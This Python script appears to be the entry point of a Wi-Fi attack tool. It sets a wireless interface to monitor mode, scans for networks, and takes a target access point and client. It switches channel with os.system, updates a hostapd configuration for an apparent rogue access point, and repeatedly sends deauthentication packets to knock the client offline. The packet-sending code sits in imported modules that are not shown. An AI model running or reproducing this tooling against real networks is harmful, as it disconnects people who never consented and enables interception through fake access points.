#!/usr/bin/env python
import os
import sys
# import codecs
# import time
from colorama import Fore, Style, Back
# from scapy.all import sniff,sendp
# from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq , Dot11ProbeResp, Dot11Deauth, RadioTap
import logging

import fileinput
import signal
import colorama
from sys import platform
import threading
import argparse
from multiprocessing import Process

# import functions
from configs.config import setMonitorMode,updateHostAP,setManagerMode
from scanning.sniffing import sniffClients,scanNetworks
from spoofing.spoofing import setTarget

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)



def attack():
    interface = wlan = input("\nEnter full interface name to set to Monitor Mode: \n "
                             "(The full address can be found via the terminal... run command 'pwconfig' and find the desired device) \n \n ")

    setMonitorMode(wlan)

    print("\nIn order to change back card into regular wifi-mode run the following command after you are done: \n"
          "service NetworkManager restart\n")

    try:
        known = scanNetworks(interface)

    except KeyboardInterrupt:
        print("Press Ctrl-C to finish scanning for networks")
        pass

    print("Dauth stage: ")
    # Let the user input the MAC address of the router
    BSSID = input('Please enter the BSSID/MAC address of the AP: ')

    print('Changing ' + wlan + ' to channel ' + str(known[BSSID][1]))
    os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))

    updateHostAP(known,BSSID)

    sniffClients(wlan, BSSID)

    brdMac = input(
        'Please enter the BSSID/MAC address of the client you wish to attack: ')

    print('Sending deauth packets now, press ctrl+c to end the attack')
    print('' * 2)

    setTarget(brdMac,interface,BSSID)

    while True:
        ans = input("DONE! do you want to keep attacking? (n/y): ")
        if(ans == 'y'):
            setTarget(brdMac,interface,BSSID)
        else:
            print("finishing attack")
            ans2 = input(
                "do you wish to turn your interface to managed mode again? (y/n):  ")
            if(ans2 == 'y'):
                setManagerMode(wlan)
                break
            else:
                break


if __name__ == "__main__":
    attack()
